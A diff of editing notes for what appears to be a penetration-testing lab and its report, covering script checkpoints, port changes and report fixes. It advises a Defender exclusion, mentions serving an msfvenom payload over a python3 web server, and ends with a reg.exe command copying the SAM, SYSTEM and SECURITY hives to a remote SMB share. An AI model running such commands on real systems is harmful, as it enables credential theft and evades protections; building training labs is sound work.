@@ -1,13 +1,19 @@
-DC01 script:
-Change: Current checkpoint is: 10 (at the end of the DC01 script.) Instead say "Setup Complete".
+pentest-report.txt quarantined by Windows Defender
+Ensure you set a defender exclusion before you unzip the project on your PC
+
+----------------------------------
+Scripts:
+Make sure Windows Security is initialized before running the script
+
+Confirm these scripts still work after the edits:
+DC01 script
+DEV01 script
 
 
+------------------------------------------------
 
-DEV01 script:
-1. Add a checkpoint in this script, so if MyService is already created and the permissions are already set (if Step 7 is complete) it will start with the manual step (Install XAMPP for Windows)
-2. Reboot DEV01 and confirm the wordpress database is accessible.
-(If Apache/MySQL can't be started, reboot.)
 
+Penetration Testing Report Edits:
 
 ADMIN04:
 
@@ -24,6 +30,8 @@ Change Port 443 to 4451
 Change Port 444 to 4452
 
 
+OVERALL:
+Make sure in the penetration testing report, you change directory to the intended directory, before creating the msfvenom payload. Make sure the python3 http server is started immediately after creating the payload.
 
 
 
@@ -37,17 +45,11 @@ WEB02: Before getting NT Authority, are we able to check the MP preference to se
 DMZ01: Before getting NT Authority, are we able to read Chris' PowerShell history file?
 
 
-Root Folder - pentest-report.txt quarantined by Windows Defender
 
 
-Make sure Windows Security is initialized before running the script
 
-Make sure in the penetration testing report, you change directory to the intended directory, before creating the msfvenom payload. Make sure the python3 http server is started immediately after creating the payload.
-
-
-When creating the new virtual machine, set the encryption password to password123!!
-In the Virtual Machine Settings, Under "Device status", enable "Connect at power on" (you have to do this for each OS).
-
+----------------------------
+Potential Edits:
 
 WEB02 execution:
 PS C:\Windows\System32> reg.exe save hklm\sam \\10.10.14.10\samba\sam.save; reg.exe save hklm\system \\10.10.14.10\samba\system.save; reg.exe save hklm\security \\10.10.14.10\samba\security.save
